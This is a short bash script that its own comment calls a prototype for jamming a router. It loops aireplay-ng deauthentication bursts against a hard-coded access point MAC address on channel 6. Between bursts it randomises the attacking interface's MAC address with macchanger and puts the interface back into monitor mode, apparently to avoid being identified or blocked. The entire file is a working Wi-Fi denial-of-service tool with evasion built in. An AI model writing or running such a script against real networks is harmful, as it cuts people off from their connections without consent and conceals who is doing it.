#!/bin/bash
#just a prototype
#sends deauth signal to router, jamming it

while true
do
	aireplay-ng -0 5 -a EC:A9:40:00:D1:B0 wlan0mon
	
	iwconfig wlan0mon channel 6

	ifconfig wlan0mon down
	macchanger -r wlan0mon | grep "New Mac"

	iwconfig wlan0mon mode monitor
	ifconfig wlan0mon up
	iwconfig wlan0mon | grep Mode

	sleep 3
	echo Waiting
done
